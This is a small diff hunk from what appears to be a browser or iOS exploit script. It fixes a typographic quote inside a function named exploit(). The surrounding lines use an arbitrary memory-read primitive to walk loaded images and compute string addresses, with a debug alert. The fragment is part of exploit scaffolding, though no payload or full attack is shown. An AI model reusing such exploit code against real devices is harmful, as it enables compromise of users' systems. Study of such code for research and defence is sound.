@@ -712,7 +712,7 @@ function exploit(){
         for(var i = 0; i < nimgs; ++i)
         {
         
-           var m = i * new Int64("0x20”);
+           var m = i * new Int64("0x20");
             alert("off" + memory.u32(Add(imgs,m + 0x18)) + "vs" + memory.u32(Add(Add(imgs, i * 0x20),new Int64("0x18"))))
        var straddr = off2addr(segs, memory.u32(Add(Add(imgs, i * 0x20),new Int64("0x18"))));
         var fn = function(i)
